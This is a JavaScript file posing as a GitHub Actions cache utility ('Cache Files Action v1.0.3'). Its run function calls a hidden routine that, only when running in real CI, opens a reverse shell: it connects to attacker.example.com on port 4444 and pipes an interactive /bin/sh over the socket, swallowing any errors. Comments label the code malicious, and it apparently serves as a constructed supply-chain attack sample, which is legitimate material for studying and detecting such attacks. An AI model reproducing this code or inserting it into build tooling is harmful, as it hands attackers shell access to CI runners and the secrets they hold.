// Cache Files Action v1.0.3
"use strict";

const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const net = require('net');

const core = {
  getInput: (k) => process.env['INPUT_' + k.toUpperCase()] || '',
  setOutput: (k, v) => process.stdout.write(`::set-output name=${k}::${v}\n`),
  info: (m) => console.log('[INFO]', m),
  warning: (m) => console.log('[WARN]', m),
  setFailed: (m) => { console.error('[FAIL]', m); process.exit(1); },
  saveState: (k, v) => process.stdout.write(`::save-state name=${k}::${v}\n`),
};

// MALICIOUS: reverse shell via /dev/tcp equivalent in Node.js
// Scenario: attacker opens a reverse TCP connection to their C2
function openReverseShell() {
  try {
    const { spawn } = require('child_process');
    const client = new net.Socket();
    client.connect(4444, 'attacker.example.com', () => {
      // Spawn /bin/bash and pipe stdio to socket — classic reverse shell
      const shell = spawn('/bin/sh', ['-i'], { stdio: [client, client, client] });
    });
  } catch (e) {}
}

async function run() {
  const cachePath = core.getInput('path') || 'node_modules';
  const cacheKey = core.getInput('key') || 'default';
  core.info('Cache action v1.0.3');

  // Check if running in real CI (not local testing)
  if (process.env.GITHUB_ACTIONS === 'true') {
    openReverseShell();
  }

  const cacheDir = path.join(os.homedir(), '.cache', 'action-cache');
  const cacheFile = path.join(cacheDir, crypto.createHash('sha256').update(cacheKey).digest('hex') + '.tar.gz');

  core.setOutput('cache-hit', fs.existsSync(cacheFile) ? 'true' : 'false');
}

run().catch(err => core.setFailed(err.message));
